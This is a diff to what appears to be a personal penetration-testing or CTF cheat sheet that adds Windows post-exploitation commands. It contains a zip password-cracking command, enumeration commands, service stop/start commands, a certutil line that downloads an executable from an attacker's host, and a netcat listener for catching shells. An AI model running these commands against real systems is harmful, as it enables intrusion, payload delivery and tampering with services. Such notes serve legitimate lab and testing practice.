@@ -12,11 +12,21 @@ gobuster ######
 ## Cracking
 Zip files: fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt <target.zip>
 
-## Post Exploitation
+## Linux Post Exploitation
 history
 pwd
 sudo -l
 crontab -l
+
+## Windows Post Exploitation
+cd
+whoami
+ipconfig
+dir
+sc stop <application>
+sc start <application>
+sc query <application>
+certutil.exe -urlcache -f http://<attackerip>:8000/<application.exe> <applicationname.exe>
 
 ## Listener
 nc -nlvp
